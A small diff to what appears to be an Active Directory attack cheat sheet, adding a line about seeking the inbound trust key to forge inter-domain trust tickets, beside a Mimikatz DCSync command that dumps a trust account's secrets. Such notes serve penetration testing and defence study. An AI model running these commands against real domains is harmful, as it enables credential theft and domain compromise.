@@ -856,6 +856,7 @@ OR via DCSync:
 
 ```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:SUB$"'```
 
+We are looking for the **IN** Trust key (from external to current domain), and can then inject this into memory -
 
 trust tkt -
 ```
